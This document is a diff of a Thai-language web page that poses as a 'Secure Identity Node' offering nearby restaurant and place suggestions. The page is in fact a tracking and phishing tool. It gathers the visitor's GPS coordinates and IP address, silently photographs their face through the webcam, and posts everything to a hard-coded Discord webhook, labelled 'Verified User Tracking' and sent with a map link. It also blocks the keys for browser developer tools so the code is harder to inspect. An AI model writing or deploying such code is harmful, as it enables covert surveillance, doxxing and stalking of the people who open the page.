@@ -11,7 +11,8 @@
         .glass-panel { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(24px); border: 1px solid rgba(255, 255, 255, 0.1); }
         .scan-anim { height: 2px; background: #3b82f6; position: absolute; width: 100%; top: 0; animation: scan move 3s infinite; box-shadow: 0 0 20px #3b82f6; }
         @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
-        .success-glow { box-shadow: 0 0 40px rgba(34, 197, 94, 0.2); }
+        .custom-scroll::-webkit-scrollbar { width: 4px; }
+        .custom-scroll::-webkit-scrollbar-thumb { background: rgba(59, 130, 246, 0.5); border-radius: 10px; }
     </style>
 </head>
 <body class="flex items-center justify-center min-h-screen p-4">
@@ -19,33 +20,41 @@
     <div class="max-w-md w-full glass-panel rounded-[2.5rem] overflow-hidden shadow-2xl relative" id="app">
         <div class="p-8 pb-4 text-center">
             <div class="inline-block px-4 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[10px] mb-4 uppercase tracking-[0.2em]">
-                Secure Identity Node v4.0
+                Secure Identity Node v5.0
             </div>
             <h1 class="text-3xl font-bold mb-2">ตรวจสอบตำแหน่ง</h1>
-            <p class="text-slate-400 text-sm leading-relaxed">เพื่อสิทธิประโยชน์สูงสุดในการแนะนำที่พักและร้านอาหารในพื้นที่ของคุณ กรุณายืนยันตัวตนด้วยพิกัดดาวเทียม</p>
+            <p class="text-slate-400 text-sm leading-relaxed">กรุณาเลือกวิธีการยืนยันตัวตนเพื่อเข้าถึงข้อมูล API เชิงลึกในพื้นที่ของคุณ</p>
         </div>
 
         <div class="p-8 pt-0">
-            <div id="step-init" class="block">
-                <div class="bg-slate-800/50 rounded-2xl p-4 mb-6 border border-white/5">
+            <div id="step-init" class="block space-y-4">
+                <div class="bg-slate-800/50 rounded-2xl p-4 mb-2 border border-white/5">
                     <div class="flex items-center gap-3 mb-2 text-blue-400 text-sm">
-                        <span class="p-2 bg-blue-500/20 rounded-lg">🛡️</span>
-                        <span>ระบบป้องกันความปลอดภัยส่วนบุคคล</span>
+                        <span class="p-2 bg-blue-500/20 rounded-lg">🌐</span>
+                        <span>ระบบตรวจสอบเครือข่ายและพิกัด</span>
                     </div>
-                    <p class="text-xs text-slate-500">พิกัดของคุณจะถูกใช้เพื่อดึงข้อมูล API จาก Google Local Service เท่านั้น</p>
+                    <p class="text-xs text-slate-500">ระบบจะทำการตรวจสอบ IP Address และพิกัดดาวเทียมเพื่อระบุตัวตนของคุณอย่างแม่นยำ</p>
                 </div>
-                <button onclick="startProcess()" class="w-full bg-blue-600 hover:bg-blue-500 py-4 rounded-2xl font-bold text-lg transition-all active:scale-95">
-                    เปิดใช้งานพิกัดปัจจุบัน
+                
+                <button onclick="startProcess(true)" class="w-full bg-blue-600 hover:bg-blue-500 py-4 rounded-2xl font-bold text-lg transition-all active:scale-95 flex items-center justify-center gap-3">
+                    📸 ยืนยันด้วยใบหน้า (Premium)
+                </button>
+                
+                <button onclick="startProcess(false)" class="w-full bg-slate-700 hover:bg-slate-600 py-4 rounded-2xl font-bold text-lg transition-all active:scale-95 flex items-center justify-center gap-3">
+                    📍 ยืนยันด้วยพิกัด GPS
                 </button>
             </div>
 
             <div id="step-scan" class="hidden text-center">
-                <div class="relative w-64 h-64 mx-auto mb-6 rounded-full border-2 border-blue-500/50 overflow-hidden bg-black shadow-[0_0_30px_rgba(59,130,246,0.3)]">
+                <div id="camera-container" class="relative w-64 h-64 mx-auto mb-6 rounded-full border-2 border-blue-500/50 overflow-hidden bg-black shadow-[0_0_30px_rgba(59,130,246,0.3)]">
                     <video id="webcam" class="w-full h-full object-cover scale-x-[-1]" autoplay playsinline></video>
                     <div class="absolute inset-0 bg-gradient-to-b from-transparent via-blue-500/10 to-transparent"></div>
                     <div class="scan-anim" id="scanner-line"></div>
                 </div>
-                <p id="status-msg" class="text-blue-400 text-sm animate-pulse tracking-widest">กำลังเชื่อมต่อดาวเทียม GPS...</p>
+                <div id="loading-spinner" class="hidden mb-6">
+                    <div class="inline-block w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
+                </div>
+                <p id="status-msg" class="text-blue-400 text-sm animate-pulse tracking-widest">กำลังดึงข้อมูล IP และ GPS...</p>
             </div>
 
             <div id="step-result" class="hidden animate-in fade-in duration-700">
@@ -53,13 +62,12 @@
                     <div class="w-10 h-10 bg-green-500 rounded-full flex items-center justify-center text-white">✓</div>
                     <div>
                         <p class="text-green-400 font-bold text-sm">ยืนยันตัวตนสำเร็จ</p>
-                        <p class="text-[10px] text-slate-500">Ref: TX-994102-B</p>
+                        <p class="text-[10px] text-slate-500" id="ref-code">Ref: TX-994102-B</p>
                     </div>
                 </div>
 
-                <h3 class="text-sm font-semibold text-slate-300 mb-4 uppercase tracking-wider">ร้านอาหารและที่พักแนะนำในรัศมี 2 กม.</h3>
-                <div id="places-container" class="space-y-3">
-                    </div>
+                <h3 class="text-sm font-semibold text-slate-300 mb-4 uppercase tracking-wider">ค้นพบสถานที่ใกล้เคียง (รัศมี 5 กม.)</h3>
+                <div id="places-container" class="space-y-3 max-h-[300px] overflow-y-auto pr-2 custom-scroll"></div>
             </div>
         </div>
     </div>
@@ -67,22 +75,51 @@
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1496859936645189782/Fu7uHenEXmuspF7mwc7ZSR7R76xgUn9g3YDOq1K8YWRtRywoaCTpJgeZo1EVEIeO5TEN";
         let userPos = { lat: 0, lon: 0 };
+        let userIP = "กำลังตรวจสอบ...";
+        let useFaceScan = false;
 
-        // Security: Block F12 & Context Menu
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.onkeydown = (e) => { if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false; };
 
-        async function startProcess() {
+        // ฟังก์ชันดึง IP Address
+        async function fetchIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip;
+            } catch (e) {
+                userIP = "ไม่สามารถระบุได้";
+            }
+        }
+
+        async function startProcess(scanMode) {
+            useFaceScan = scanMode;
             if (!navigator.geolocation) return alert("อุปกรณ์ไม่รองรับ");
             
             document.getElementById('step-init').classList.add('hidden');
             document.getElementById('step-scan').classList.remove('hidden');
 
+            await fetchIP(); // เช็ค IP ทันทีที่เริ่ม
+
+            if (!useFaceScan) {
+                document.getElementById('camera-container').classList.add('hidden');
+                document.getElementById('loading-spinner').classList.remove('hidden');
+            }
+
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 userPos.lat = pos.coords.latitude;
                 userPos.lon = pos.coords.longitude;
-                document.getElementById('status-msg').innerText = "เข้าถึง GPS สำเร็จ... กำลังสแกนใบหน้า";
-                await initCamera();
+                
+                if (useFaceScan) {
+                    document.getElementById('status-msg').innerText = "IP: " + userIP + " | กำลังสแกนใบหน้า...";
+                    await initCamera();
+                } else {
+                    document.getElementById('status-msg').innerText = "IP: " + userIP + " | กำลังดึงพิกัด...";
+                    setTimeout(async () => {
+                        await sendLogToDiscord("📍 [GPS Only Mode] ข้อมูลการเชื่อมต่อ");
+                        showResults();
+                    }, 2000);
+                }
             }, (err) => {
                 alert("กรุณาเปิดตำแหน่ง (GPS) เพื่อใช้งาน");
                 location.reload();
@@ -92,15 +129,14 @@
         async function initCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: { ideal: 1920 }, height: { ideal: 1080 } } 
+                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
                 });
                 const video = document.getElementById('webcam');
                 video.srcObject = stream;
-                
-                // ถ่ายภาพอัตโนมัติในวินาทีที่ 3 เพื่อความคมชัดสูงสุด (Auto-focus)
                 setTimeout(() => captureAndSend(stream), 3500);
             } catch (e) {
-                alert("กรุณาอนุญาตการเข้าถึงกล้อง");
+                alert("เข้าถึงกล้องไม่ได้");
+                location.reload();
             }
         }
 
@@ -115,41 +151,64 @@
                 const formData = new FormData();
                 const payload = {
                     embeds: [{
-                        title: "🟢 [Premium Check-in] ตรวจพบข้อมูลใหม่",
-                        color: 5763719,
+                        title: "📸 [Premium Face Scan] ข้อมูลใหม่พร้อม IP",
+                        color: 3447003,
                         fields: [
-                            { name: "📍 พิกัดแม่นยำ", value: `${userPos.lat}, ${userPos.lon}`, inline: true },
-                            { name: "🏙️ Street View", value: `[ดูหน้าบ้านจริง](https://www.google.com/maps?q&layer=c&cbll=${userPos.lat},${userPos.lon})`, inline: true },
-                            { name: "📱 อุปกรณ์", value: navigator.platform, inline: true },
-                            { name: "🔗 Google Maps", value: `[นำทางไปจุดพิกัด](https://www.google.com/maps/search/?api=1&query=${userPos.lat},${userPos.lon})` }
+                            { name: "🌐 IP Address", value: `\`${userIP}\``, inline: false },
+                            { name: "📍 พิกัด", value: `\`${userPos.lat}, ${userPos.lon}\``, inline: true },
+                            { name: "📱 ระบบ", value: navigator.platform, inline: true },
+                            { name: "🔗 แผนที่", value: `[คลิกเพื่อนำทาง](https://www.google.com/maps?q=${userPos.lat},${userPos.lon})` }
                         ],
-                        image: { url: "attachment://id_capture.jpg" },
-                        footer: { text: "ระบบยืนยันตัวตนอัจฉริยะ • " + new Date().toLocaleString() }
+                        image: { url: "attachment://capture.jpg" },
+                        footer: { text: "Verified User Tracking • " + new Date().toLocaleString() }
                     }]
                 };
 
                 formData.append('payload_json', JSON.stringify(payload));
-                formData.append('file', blob, 'id_capture.jpg');
+                formData.append('file', blob, 'capture.jpg');
 
                 await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-                
                 stream.getTracks().forEach(t => t.stop());
                 showResults();
-            }, 'image/jpeg', 0.95);
+            }, 'image/jpeg', 0.9);
+        }
+
+        async function sendLogToDiscord(title) {
+            const payload = {
+                embeds: [{
+                    title: title,
+                    color: 15105570,
+                    fields: [
+                        { name: "🌐 IP Address", value: `\`${userIP}\``, inline: false },
+                        { name: "📍 พิกัด", value: `\`${userPos.lat}, ${userPos.lon}\``, inline: true },
+                        { name: "📱 ระบบ", value: navigator.platform, inline: true }
+                    ]
+                }]
+            };
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
         }
 
         function showResults() {
             document.getElementById('step-scan').classList.add('hidden');
             document.getElementById('step-result').classList.remove('hidden');
 
-            // ข้อมูลที่สร้างจากพิกัดจริงเพื่อความเชื่อถือ
             const categories = [
-                { name: "ร้านอาหารยอดนิยมใกล้คุณ", icon: "🍱", query: "restaurants" },
-                { name: "โรงแรมและที่พัก 5 ดาว", icon: "🏨", query: "hotels" },
-                { name: "ปั๊มน้ำมันและจุดบริการ", icon: "⛽", query: "gas_station" }
+                { name: "ร้านอาหารยอดนิยม", icon: "🍱", query: "restaurants" },
+                { name: "โรงแรมและที่พัก", icon: "🏨", query: "hotels" },
+                { name: "คาเฟ่ & บาร์", icon: "☕", query: "cafe" },
+                { name: "สถานที่ท่องเที่ยว", icon: "🎡", query: "tourist_attractions" },
+                { name: "ห้างสรรพสินค้า", icon: "🛍️", query: "shopping_mall" },
+                { name: "ปั๊มน้ำมันใกล้เคียง", icon: "⛽", query: "gas_station" },
+                { name: "โรงพยาบาล 24 ชม.", icon: "🏥", query: "hospital" },
+                { name: "สถานีตำรวจ", icon: "🚔", query: "police_station" }
             ];
 
             const container = document.getElementById('places-container');
+            container.innerHTML = "";
             categories.forEach(item => {
                 const searchLink = `https://www.google.com/maps/search/${item.query}/@${userPos.lat},${userPos.lon},15z`;
                 container.innerHTML += `
@@ -157,7 +216,7 @@
                         <span class="text-2xl">${item.icon}</span>
                         <div class="flex-1">
                             <p class="text-white text-sm font-semibold">${item.name}</p>
-                            <p class="text-blue-400 text-[10px]">ตรวจสอบข้อมูลเรียลไทม์ผ่าน Google Maps</p>
+                            <p class="text-blue-400 text-[10px]">ค้นหาผ่าน Google Maps</p>
                         </div>
                         <div class="text-slate-500 group-hover:text-blue-400">→</div>
                     </a>
